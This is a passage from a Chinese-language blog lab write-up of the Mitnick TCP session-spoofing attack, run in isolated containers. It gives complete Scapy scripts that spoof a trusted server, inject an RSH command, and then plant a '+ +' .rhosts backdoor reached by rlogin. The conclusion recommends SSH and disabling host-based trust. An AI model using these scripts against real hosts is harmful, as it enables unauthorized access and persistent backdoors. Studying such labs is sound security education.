+</span></span><span class="line"><span class="cl">       <span class="n">data</span>  <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">srv_port2</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">seed</span><span class="se">\x00</span><span class="s1">seed</span><span class="se">\x00</span><span class="s1">touch /tmp/mitnick</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">       <span class="c1">#data = str(srv_port2) + &#39;\x00seed\x00seed\x00echo + + &gt; .rhosts\x00&#39;</span>
+</span></span><span class="line"><span class="cl">       <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;      Sending data: </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">       <span class="n">send</span><span class="p">(</span><span class="n">ip</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">data</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       <span class="c1"># Reset the connection after 2 seconds</span>
+</span></span><span class="line"><span class="cl">       <span class="c1"># This is not necessary. We did this, so we can repeat the attack.</span>
+</span></span><span class="line"><span class="cl">       <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">       <span class="n">tcp</span><span class="o">.</span><span class="n">flags</span> <span class="o">=</span> <span class="s2">&#34;R&#34;</span>
+</span></span><span class="line"><span class="cl">       <span class="n">tcp</span><span class="o">.</span><span class="n">seq</span>   <span class="o">=</span> <span class="n">syn_seq</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">       <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;  </span><span class="si">{}</span><span class="s1">--&gt;</span><span class="si">{}</span><span class="s1"> Resetting connection&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">tcp</span><span class="o">.</span><span class="n">sport</span><span class="p">,</span> <span class="n">tcp</span><span class="o">.</span><span class="n">dport</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">       <span class="n">send</span><span class="p">(</span><span class="n">ip</span><span class="o">/</span><span class="n">tcp</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="s1">&#39;tcp and src host </span><span class="si">{}</span><span class="s1"> and src port </span><span class="si">{}</span><span class="s1"> and dst host </span><span class="si">{}</span><span class="s1"> and dst port </span><span class="si">{}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">myFilter</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">x_ip</span><span class="p">,</span> <span class="n">x_port</span><span class="p">,</span> <span class="n">srv_ip</span><span class="p">,</span> <span class="n">srv_port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="s1">&#39;br-302e4ba285b3&#39;</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="n">myFilter</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">spoof</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>终端 2 运行 <code>spoof_syn_ack_2nd.py</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> volumes
+</span></span><span class="line"><span class="cl">python3 spoof_syn_ack_2nd.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个脚本用于处理 X-Terminal 产生的第二个反向连接握手</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">x_ip</span>      <span class="o">=</span> <span class="s2">&#34;10.9.0.5&#34;</span>  <span class="c1"># X-Terminal</span>
+</span></span><span class="line"><span class="cl"><span class="n">srv_ip</span>    <span class="o">=</span> <span class="s2">&#34;10.9.0.6&#34;</span>  <span class="c1"># The trusted server</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">x_port</span>    <span class="o">=</span> <span class="mi">514</span>         <span class="c1"># Port number used by X-Terminal</span>
+</span></span><span class="line"><span class="cl"><span class="n">srv_port</span>  <span class="o">=</span> <span class="mi">1023</span>        <span class="c1"># Port number used by the trusted server</span>
+</span></span><span class="line"><span class="cl"><span class="n">srv_port2</span> <span class="o">=</span> <span class="mi">9090</span>        <span class="c1"># Port number used by the 2nd connection</span>
+</span></span><span class="line"><span class="cl"><span class="n">syn_seq</span>   <span class="o">=</span> <span class="mh">0x1000</span>      <span class="c1"># Initial sequence number </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Spoof the SYN+ACK to finish the 2nd connection intiated by X-Terminal</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Only allowed to use the sequence number &amp; src port in captured packet</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">spoof</span><span class="p">(</span><span class="n">pkt</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Spoof a SYN+ACK reply after receiving a SYN packet</span>
+</span></span><span class="line"><span class="cl">    <span class="n">old_tcp</span> <span class="o">=</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">old_tcp</span><span class="o">.</span><span class="n">flags</span> <span class="o">==</span> <span class="s1">&#39;S&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">       <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;  </span><span class="si">{}</span><span class="s1">--&gt;</span><span class="si">{}</span><span class="s1"> Spoofing SYN+ACK.&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">old_tcp</span><span class="o">.</span><span class="n">dport</span><span class="p">,</span> <span class="n">old_tcp</span><span class="o">.</span><span class="n">sport</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">       <span class="c1">####################################################</span>
+</span></span><span class="line"><span class="cl">       <span class="n">ip</span>  <span class="o">=</span> <span class="n">IP</span> <span class="p">(</span> <span class="n">src</span>   <span class="o">=</span> <span class="n">srv_ip</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                  <span class="n">dst</span>   <span class="o">=</span> <span class="n">x_ip</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">       <span class="n">tcp</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">(</span> <span class="n">sport</span> <span class="o">=</span> <span class="n">srv_port2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                  <span class="n">dport</span> <span class="o">=</span> <span class="n">old_tcp</span><span class="o">.</span><span class="n">sport</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                  <span class="n">seq</span>   <span class="o">=</span> <span class="mi">2000</span><span class="p">,</span>   <span class="c1"># can be any number</span>
+</span></span><span class="line"><span class="cl">                  <span class="n">ack</span>   <span class="o">=</span> <span class="n">old_tcp</span><span class="o">.</span><span class="n">seq</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                  <span class="n">flags</span><span class="o">=</span><span class="s2">&#34;SA&#34;</span><span class="p">)</span>     <span class="c1"># Set the SYN + ACK bits</span>
+</span></span><span class="line"><span class="cl">       <span class="c1">####################################################</span>
+</span></span><span class="line"><span class="cl">       <span class="n">send</span><span class="p">(</span><span class="n">ip</span><span class="o">/</span><span class="n">tcp</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="s1">&#39;tcp and src host </span><span class="si">{}</span><span class="s1"> and dst port </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">x_ip</span><span class="p">,</span> <span class="n">srv_port2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="s1">&#39;br-302e4ba285b3&#39;</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="n">f</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">spoof</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>终端 3 运行 <code>spoof_syn.py</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> volumes
+</span></span><span class="line"><span class="cl">python3 spoof_syn.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个脚本负责向 X-Terminal 发送伪造的 SYN 包，触发整个攻击流程。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">x_ip</span>      <span class="o">=</span> <span class="s2">&#34;10.9.0.5&#34;</span>  <span class="c1"># X-Terminal</span>
+</span></span><span class="line"><span class="cl"><span class="n">srv_ip</span>    <span class="o">=</span> <span class="s2">&#34;10.9.0.6&#34;</span>  <span class="c1"># The trusted server</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">x_port</span>    <span class="o">=</span> <span class="mi">514</span>         <span class="c1"># Port number used by X-Terminal</span>
+</span></span><span class="line"><span class="cl"><span class="n">srv_port</span>  <span class="o">=</span> <span class="mi">1023</span>        <span class="c1"># Port number used by the trusted server</span>
+</span></span><span class="line"><span class="cl"><span class="n">port_2nd</span>  <span class="o">=</span> <span class="mi">9090</span>        <span class="c1"># Port number used by the 2nd connection</span>
+</span></span><span class="line"><span class="cl"><span class="n">syn_seq</span>   <span class="o">=</span> <span class="mh">0x1000</span>      <span class="c1"># Initial sequence number </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Spoof a SYN from Trusted Server to X-Terminal</span>
+</span></span><span class="line"><span class="cl"><span class="n">ip</span>  <span class="o">=</span> <span class="n">IP</span><span class="p">(</span>  <span class="n">src</span>   <span class="o">=</span> <span class="n">srv_ip</span><span class="p">,</span> <span class="n">dst</span>   <span class="o">=</span> <span class="n">x_ip</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tcp</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">(</span> <span class="n">sport</span> <span class="o">=</span> <span class="n">srv_port</span><span class="p">,</span> <span class="n">dport</span> <span class="o">=</span> <span class="n">x_port</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">           <span class="n">seq</span>   <span class="o">=</span> <span class="n">syn_seq</span><span class="p">,</span> <span class="n">flags</span> <span class="o">=</span> <span class="s1">&#39;S&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Sending SYN...&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">send</span><span class="p">(</span><span class="n">ip</span><span class="o">/</span><span class="n">tcp</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="4.png" style="width: 90%;" />
+<h3 id="验证攻击结果">验证攻击结果
+</h3><p>回到受害者容器中检查 <code>/tmp/mitnick</code> 文件是否生成，这里可以看到文件说明攻击者成功伪造服务器身份并注入了命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ls -l /tmp/mitnick
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="5.png" style="width: 90%;" />
+<h2 id="设置永久后门">设置永久后门
+</h2><p>前面的攻击只是创建了一个文件。为了进一步利用受害者，攻击者可以通过注入命令修改 <code>.rhosts</code> 文件来植入永久后门</p>
+<h3 id="修改攻击载荷">修改攻击载荷
+</h3><p>在攻击机中修改 <code>spoof_ack_plus_data.py</code> 的数据部分，将原来的 <code>touch</code> 命令替换为修改 <code>.rhosts</code> 的命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">srv_port2</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">seed</span><span class="se">\x00</span><span class="s1">seed</span><span class="se">\x00</span><span class="s1">echo + + &gt; .rhosts</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>+ +</code> 表示信任任意主机上的任意用户。这个配置非常危险，一旦写入成功，攻击者就可以直接登录受害主机</p>
+<h3 id="重新执行攻击流程">重新执行攻击流程
+</h3><p>重新运行前面的三个攻击脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 spoof_ack_plus_data.py
+</span></span><span class="line"><span class="cl">python3 spoof_syn_ack_2nd.py
+</span></span><span class="line"><span class="cl">python3 spoof_syn.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>攻击完成后，回到攻击机容器中切换到 <code>seed</code> 用户，并尝试直接登录 X-Terminal：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">su seed
+</span></span><span class="line"><span class="cl">rlogin 10.9.0.5
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果无需密码即可进入 <code>10.9.0.5</code> 的 Shell，说明后门已经植入成功。</p>
+<img src="6.png" style="width: 90%;" />
+<p>进入后可以查看 <code>.rhosts</code> 文件内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">more .rhosts
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果文件内容变成：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">+ +
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>说明 X-Terminal 的信任策略已经被篡改，攻击者获得了对受害主机的直接访问权限。</p>
+<img src="7.png" style="width: 90%;" />
+<h2 id="实验结论">实验结论
+</h2><p>Mitnick 攻击利用了早期 TCP 协议和基于主机信任机制的安全缺陷。攻击者先让真实 Trusted Server 静默，再伪造其 IP 地址与 X-Terminal 建立连接，通过预测 TCP 序列号完成伪造握手，最后借助 RSH 协议注入命令。</p>
+<p>这个实验可以看出，单纯依赖 IP 地址和主机信任关系进行认证是不安全的。攻击者只要能够伪造源 IP 并预测连接状态，就可能绕过登录认证。</p>
+<p>RSH、RLOGIN 这类协议本身缺乏加密和强认证机制，已经不适合在真实环境中使用。实际环境中应使用 SSH 替代，并关闭 <code>.rhosts</code>、<code>hosts.equiv</code> 这类基于主机信任的认证方式。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+
+        
+        <div id="viewCount">
+            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-eye"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0" /><path d="M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6" /></svg>
+            <time class="article-time--reading">
+                <span id="vercount_value_page_pv">loading... </span>次
+            </time>
+        </div>
+        
+    <style>
+         
+        #viewCount,
+        #viewCount * {
+            color: #ffffffe1 !important;
+        }
+        #viewCount {
+             position: absolute;   
+             left: 280px;            
+            transform: translateY(-50%) translateY(260px);
+        }
+    </style></footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+	const mainArticleElement = document.querySelector(".main-article");
+        renderMathInElement(mainArticleElement, {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/post/tcp/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/cover/tcp.jpg" loading="lazy" data-key="" data-hash="/images/cover/tcp.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TCP协议攻击</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/icmp/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/cover/icmp.jpg" loading="lazy" data-key="" data-hash="/images/cover/icmp.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ICMP重定向与中间人攻击</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/dns/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/cover/dns.jpg" loading="lazy" data-key="" data-hash="/images/cover/dns.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DNS重绑定攻击实验</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/arp/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/cover/arp.jpg" loading="lazy" data-key="" data-hash="/images/cover/arp.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ARP攻击原理学习</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/streaming/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/cover/st1.jpg" loading="lazy" data-key="" data-hash="/images/cover/st1.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Sunshine&#43;Moonlight远程串流</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+        
+  <div id="like-container">
+    <img id="like-icon" src="/icons/thumb-up.svg" alt="Like" />
+    <span id="like-count">0</span>
+  </div>
+
+  <style>
+    #like-container {
+      text-align: center;
+	display: flex;
+  flex-direction: column;
+  align-items: center;
+  margin: 2rem 0;
+  margin: -3rem 0 -5rem 0rem;
+      user-select: none;
+      color: white;
+    }
+
+    #like-icon {
+      width: 33px;
+      height: 36px;
+      cursor: pointer;
+      transition: transform 0.15s ease;
+      filter: brightness(0) invert(1);
+    }
+
+    #like-icon.clicked {
+      animation: bounce 0.4s ease;
+    }
+
+    @keyframes bounce {
+      0%   { transform: scale(1); }
+      50%  { transform: scale(1.4); }
+      100% { transform: scale(1); }
+    }
+
+    #like-count {
+      display: inline-block;
+      margin-left: 0px;
+      font-size: 1.5rem; 
+    }
+  </style>
+
+  <script>
+  (function () {
+    const appId = 'QMq4HFQshcHbTkGqUoX10lDK-gzGzoHsz';
+    const appKey = 'MgjYDq8Uwr9g8x8HEJ24tyEB';
+    const serverURL = 'https://qmz4hfqs.lc-cn-n1-shared.com';
+
+    const pagePath = window.location.pathname;
+    const localKey = 'liked_' + pagePath;
+    const maxLikes = 50;
+    const headers = {
+      'X-LC-Id': appId,
+      'X-LC-Key': appKey,
+      'Content-Type': 'application/json'
+    };
+
+    async function fetchLike() {
+      const res = await fetch(`${serverURL}/1.1/classes/Like?where=` + encodeURIComponent(JSON.stringify({ path: pagePath })), { headers });
+      const data = await res.json();
+      if (data.results.length > 0) {
+        return data.results[0];
+      } else {
+        const resNew = await fetch(`${serverURL}/1.1/classes/Like`, {
+          method: 'POST',
+          headers,
+          body: JSON.stringify({
+            path: pagePath,
+            count: 0,
+            ACL: {
+              "*": {
+                "read": true,
+                "write": true
+              }
+            }
+          })
+        });
+        return await resNew.json();
+      }
+    }
+
+    async function increaseLike(objectId) {
+      await fetch(`${serverURL}/1.1/classes/Like/${objectId}`, {
+        method: 'PUT',
+        headers,
+        body: JSON.stringify({ count: { __op: 'Increment', amount: 1 } })
+      });
+    }
+
+    document.addEventListener('DOMContentLoaded', async () => {
+      const icon = document.getElementById('like-icon');
+      const count = document.getElementById('like-count');
+      const likedCount = parseInt(localStorage.getItem(localKey) || '0');
+
+      const data = await fetchLike();
+      count.textContent = data.count || 0;
+
+      icon.addEventListener('click', async () => {
+        let current = parseInt(localStorage.getItem(localKey) || '0');
+        if (current >= maxLikes) return;
+
+        icon.classList.add('clicked');
+        setTimeout(() => icon.classList.remove('clicked'), 400);
+
+        count.textContent = parseInt(count.textContent) + 1;
+        localStorage.setItem(localKey, current + 1);
+        await increaseLike(data.objectId);
+      });
+    });
+  })();
+  </script>
+
+
+
+
+
+    
+
+	
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 Thaumazein
+    </section>
+    <section class="count_info">
+  <div>
+      本站已不稳定运行
+      <span id="ds" class="running-days number-highlight"></span>
+      天
+      <span id="hs" class="running-days number-highlight"></span>
+      小时
+      <span id="ms" class="running-days number-highlight"></span>
+      分钟
+  </div>
+  <div>
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      共发表文章 
+      <span class="number-highlight">27</span> 
+      篇 ，总计 
+      <span class="number-highlight">114.11</span> 
+      k 字
+  </div>
+  <div>
+      <span id="busuanzi_container_site_pv">
+          本站总访问量：
+          <span id="busuanzi_value_site_pv" class="number-highlight"></span>
+          次
+      </span>
+  </div>
+</section>
+
+
+<script>
+let s1 = '2025-06-24'; 
+s1 = new Date(s1.replace(/-/g, "/"));
+let s2 = new Date();
+let timeDifference = s2.getTime() - s1.getTime();
+
+let days = Math.floor(timeDifference / (1000 * 60 * 60 * 24));
+let hours = Math.floor((timeDifference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+let minutes = Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60));
+
+
+const ds = document.getElementById('ds');
+const hs = document.getElementById('hs');
+const ms = document.getElementById('ms');
+
+ds.innerHTML = days;
+hs.innerHTML = hours;
+ms.innerHTML = minutes;
+
+
+ds.classList.add('number-highlight');
+hs.classList.add('number-highlight');
+ms.classList.add('number-highlight');
+
+
+const busuanziValue = document.getElementById('busuanzi_value_site_pv');
+if (busuanziValue) {
+    busuanziValue.classList.add('number-highlight');
+}
+</script>
+    <section class="powerby">
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+
+    </section>
+    
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
